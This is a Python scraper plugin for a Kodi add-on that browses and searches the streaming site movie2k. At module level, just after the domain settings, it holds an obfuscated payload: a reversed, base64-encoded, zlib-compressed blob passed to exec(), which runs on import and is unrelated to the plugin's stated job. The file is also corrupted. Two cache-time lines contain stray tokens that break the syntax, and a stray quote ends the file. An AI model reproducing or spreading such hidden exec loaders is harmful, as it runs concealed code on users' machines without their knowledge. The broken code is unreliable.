# -*- coding: utf-8 -*-
# Python 3
# Always pay attention to the translations in the menu!
# HTML LangzeitCache hinzugef\xc3\x83\xc2\xbcgt
# showEntries: 6 Stunden
# showEpisodes: 4 Stunden

import re

from resources.lib.handler.ParameterHandler import ParameterHandler
from resources.lib.handler.requestHandler import cRequestHandler
from resources.lib.tools import logger, cParser, validater
from resources.lib.gui.guiElement import cGuiElement
from resources.lib.config import cConfig
from resources.lib.gui.gui import cGui
from json import loads

SITE_IDENTIFIER = 'movie2k'
SITE_NAME = 'Movie2K'
SITE_ICON = 'movie2k.png'

URL_MAIN = 'https://api.movie2k.ch/data/browse/?lang=%s&type=%s&order_by=%s&page=%s' # lang=%s 2 = deutsch / 3 = englisch / all = Alles
URL_SEARCH = 'https://api.movie2k.ch/data/browse/?lang=%s&keyword=%s&page=%s'
URL_THUMBNAIL = 'https://image.tmdb.org/t/p/w300%s'
URL_WATCH = 'https://api.movie2k.ch/data/watch/?_id=%s'
# Global search function is thus deactivated!
if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'false':
 SITE_GLOBAL_SEARCH = False
 logger.info('-> [SitePlugin]: globalSearch for %s is deactivated.' % SITE_NAME)

# Domain Abfrage
DOMAIN = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '.domain', 'www2.movie2k.ch') # Domain Auswahl \xc3\x83\xc2\xbcber die xStream Einstellungen m\xc3\x83\xc2\xb6glich
STATUS = cConfig().getSetting('plugin_' + SITE_IDENTIFIER + '_status') # Status Code Abfrage der Domain
ACTIVE = cConfig().getSetting('plugin_' + SITE_IDENTIFIER) # Ob Plugin aktiviert ist oder nicht

ORIGIN = 'https://' + DOMAIN + '/'
# ORIGIN = 'https://movie2k.at/'
REFERER = ORIGIN + '/'

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))


def load():
 logger.info('Load %s' % SITE_NAME)
 params = ParameterHandler()
 sLanguage = cConfig().getSetting('prefLanguage')
 # \xc3\x83\xe2\x80\x9enderung des Sprachcodes nach voreigestellter Sprache
 if sLanguage == '0': # prefLang Alle Sprachen
 sLang = 'all'
 if sLanguage == '1': # prefLang Deutsch
 sLang = '2'
 if sLanguage == '2': # prefLang Englisch
 sLang = '3'
 elif sLanguage == '3': # prefLang Japanisch
 sLang = cGui().showLanguage()
 return
 params.setParam('sLanguage', sLang)
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502), SITE_IDENTIFIER, 'showMovieMenu'),
 params) # Movies
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511), SITE_IDENTIFIER, 'showSeriesMenu'),
 params) # Series
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30520), SITE_IDENTIFIER, 'showSearch'), params) # Search
 cGui().setEndOfDirectory()


def _cleanTitle(sTitle):
 sTitle = re.sub("[\xE4]", 'ae', sTitle)
 sTitle = re.sub("[\xFC]", 'ue', sTitle)
 sTitle = re.sub("[\xF6]", 'oe', sTitle)
 sTitle = re.sub("[\xC4]", 'Ae', sTitle)
 sTitle = re.sub("[\xDC]", 'Ue', sTitle)
 sTitle = re.sub("[\xD6]", 'Oe', sTitle)
 sTitle = re.sub("[\x00-\x1F\x80-\xFF]", '', sTitle)
 return sTitle


def _getQuality(sQuality):
 isMatch, aResult = cParser.parse(sQuality, '(HDCAM|HD|WEB|BLUERAY|BRRIP|DVD|TS|SD|CAM)', 1, True)
 if isMatch:
 return aResult[0]
 else:
 return sQuality


def showMovieMenu():
 params = ParameterHandler()
 sLanguage = params.getValue('sLanguage')
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'movies', 'featured', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502) + cConfig().getLocalizedString(30530), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'movies', 'releases', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502) + cConfig().getLocalizedString(30531), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'movies', 'trending', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502) + cConfig().getLocalizedString(30532), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'movies', 'updates', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502) + cConfig().getLocalizedString(30533), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'movies', 'requested', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502) + cConfig().getLocalizedString(30534), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'movies', 'rating', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502) + cConfig().getLocalizedString(30535), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'movies', 'votes', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502) + cConfig().getLocalizedString(30536), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'movies', 'views', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30502) + cConfig().getLocalizedString(30537), SITE_IDENTIFIER, 'showEntries'), params)
 cGui().setEndOfDirectory()

def showSeriesMenu():
 params = ParameterHandler()
 sLanguage = params.getValue('sLanguage')
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'tvseries', 'releases', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511) + cConfig().getLocalizedString(30531), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'tvseries', 'trending', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511) + cConfig().getLocalizedString(30532), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'tvseries', 'updates', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511) + cConfig().getLocalizedString(30533), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'tvseries', 'requested', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511) + cConfig().getLocalizedString(30534), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'tvseries', 'rating', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511) + cConfig().getLocalizedString(30535), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'tvseries', 'votes', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511) + cConfig().getLocalizedString(30536), SITE_IDENTIFIER, 'showEntries'), params)
 params.setParam('sUrl', URL_MAIN % (sLanguage, 'tvseries', 'views', '1'))
 cGui().addFolder(cGuiElement(cConfig().getLocalizedString(30511) + cConfig().getLocalizedString(30537), SITE_IDENTIFIER, 'showEntries'), params)
 cGui().setEndOfDirectory()


def showEntries(entryUrl=False, sGui=False, sSearchText=False):
 oGui = sGui if sGui else cGui()
 params = ParameterHandler()
 isTvshow = False
 sThumbnail = ''
 sLanguage = params.getValue('sLanguage')
 if not entryUrl: entryUrl = params.getValue('sUrl')
 try:
 oRequest = cRequestHandler(entryUrl)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 6 # HTML Cache Zeit 6 Stunden
 oRequest.addHeaderEntry('Referer', REFERER)
 oRequest.addHeaderEntry('Origin', ORIGIN)
 sJson = oRequest.request()
 aJson = loads(sJson)
 except:
 if not sGui: oGui.showInfo()
 return

 if 'movies' not in aJson or len(aJson['movies']) == 0:
 if not sGui: oGui.showInfo()
 return

 total = 0
 # ignore movies which does not contain any streams
 for movie in aJson['movies']:
 if '_id' in movie:
 total += 1
 for movie in aJson['movies']:
 sTitle = movie['title']
 if sSearchText and not cParser().search(sSearchText, sTitle):
 continue
 if 'Staffel' in sTitle:
 isTvshow = True
 oGuiElement = cGuiElement(sTitle, SITE_IDENTIFIER, 'showEpisodes' if isTvshow else 'showHosters')
 if 'poster_path_season' in movie:
 sThumbnail = URL_THUMBNAIL % movie['poster_path_season']
 elif 'poster_path' in movie:
 sThumbnail = URL_THUMBNAIL % movie['poster_path']
 elif 'backdrop_path' in movie:
 sThumbnail = URL_THUMBNAIL % movie['backdrop_path']
 oGuiElement.setThumbnail(sThumbnail)
 if 'storyline' in movie:
 oGuiElement.setDescription(movie['storyline'])
 elif 'overview' in movie:
 oGuiElement.setDescription(movie['overview'])
 if 'year' in movie:
 oGuiElement.setYear(movie['year'])
 if 'quality' in movie:
 oGuiElement.setQuality(_getQuality(movie['quality']))
 if 'rating' in movie:
 oGuiElement.addItemValue('rating', movie['rating'])
 if 'lang' in movie:
 if (sLanguage != '1' and movie['lang'] == 2): # Deutsch
 oGuiElement.setLanguage('DE')
 if (sLanguage != '2' and movie['lang'] == 3): # Englisch
 oGuiElement.setLanguage('EN')
 oGuiElement.setMediaType('tvshows' if isTvshow else 'movie')
 if 'runtime' in movie:
 isMatch, sRuntime = cParser.parseSingleResult(movie['runtime'], '\d+')
 if isMatch:
 oGuiElement.addItemValue('duration', sRuntime)
 params.setParam('entryUrl', URL_WATCH % movie['_id'])
 params.setParam('sName', sTitle)
 params.setParam('sThumbnail', sThumbnail)
 oGui.addFolder(oGuiElement, params, isTvshow, total)

 if not sGui and not sSearchText:
 curPage = aJson['pager']['currentPage']
 if curPage < aJson['pager']['totalPages']:
 sNextUrl = entryUrl.replace('page=' + str(curPage), 'page=' + str(curPage + 1))
 params.setParam('sUrl', sNextUrl)
 oGui.addNextPage(SITE_IDENTIFIER, 'showEntries', params)
 oGui.setView('tvshows' if isTvshow else 'movies')
 oGui.setEndOfDirectory()


def showEpisodes():
 aEpisodes = []
 params = ParameterHandler()
 sUrl = params.getValue('entryUrl')
 sThumbnail = params.getValue("sThumbnail")
 try:
 oRequest = cRequestHandler(sUrl)
 if cConfig().getSetting('global_search_' + SITE_IDENTIFIER) == 'true':
 oRequest.cacheTime = 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 60 plug plug2 plug3 sites sites0 test.py test.sh test.txt 4 # HTML Cache Zeit 4 Stunden
 oRequest.addHeaderEntry('Referer', REFERER)
 oRequest.addHeaderEntry('Origin', ORIGIN)
 sJson = oRequest.request()
 aJson = loads(sJson)
 except:
 cGui().showInfo()
 return

 if 'streams' not in aJson or len(aJson['streams']) == 0:
 cGui().showInfo()
 return

 for stream in aJson['streams']:
 if 'e' in stream:
 aEpisodes.append(int(stream['e']))
 if aEpisodes:
 aEpisodesSorted = set(aEpisodes)
 total = len(aEpisodesSorted)
 for sEpisode in aEpisodesSorted:
 oGuiElement = cGuiElement('Episode ' + str(sEpisode), SITE_IDENTIFIER, 'showHosters')
 oGuiElement.setThumbnail(sThumbnail)
 if 's' in aJson:
 oGuiElement.setSeason(aJson['s'])
 oGuiElement.setTVShowTitle('Episode ' + str(sEpisode))
 oGuiElement.setEpisode(sEpisode)
 oGuiElement.setMediaType('episode')
 cGui().addFolder(oGuiElement, params, False, total)
 cGui().setView('episodes')
 cGui().setEndOfDirectory()


def showHosters():
 hosters = []
 params = ParameterHandler()
 sUrl = params.getValue('entryUrl')
 sEpisode = params.getValue('episode')
 try:
 oRequest = cRequestHandler(sUrl)
 oRequest.addHeaderEntry('Referer', REFERER)
 oRequest.addHeaderEntry('Origin', ORIGIN)
 sJson = oRequest.request()
 except:
 return hosters
 if sJson:
 aJson = loads(sJson)
 if 'streams' in aJson:
 i = 0
 for stream in aJson['streams']:
 if (('e' not in stream) or (str(sEpisode) == str(stream['e']))):
 sHoster = str(i) + ':'
 isMatch, aName = cParser.parse(stream['stream'], '//([^/]+)/')
 if isMatch:
 sName = aName[0][:aName[0].rindex('.')]
 if cConfig().isBlockedHoster(sName)[0]: continue # Hoster aus settings.xml oder deaktivierten Resolver ausschlie\xc3\x83\xc5\xb8en
 sHoster = sHoster + ' ' + sName
 if 'release' in stream:
 sHoster = sHoster + ' [I][' + _getQuality(stream['release']) + '][/I]'
 hoster = {'link': stream['stream'], 'name': sHoster}
 hosters.append(hoster)
 i += 1
 if hosters:
 hosters.append('getHosterUrl')
 return hosters


def getHosterUrl(sUrl=False):
 return [{'streamUrl': sUrl, 'resolved': False}]


def showSearch():
 sSearchText = cGui().showKeyBoard()
 if not sSearchText: return
 _search(False, sSearchText)
 cGui().setEndOfDirectory()


def _search(oGui, sSearchText):
 params = ParameterHandler()
 sLanguage = cConfig().getSetting('prefLanguage')
 if sLanguage == '0': # prefLang Alle Sprachen
 sLang = 'all'
 if sLanguage == '1': # prefLang Deutsch
 sLang = '2'
 if sLanguage == '2': # prefLang Englisch
 sLang = '3'
 showEntries(URL_SEARCH % (sLang, cParser().quotePlus(sSearchText), '1'), oGui, sSearchText)'
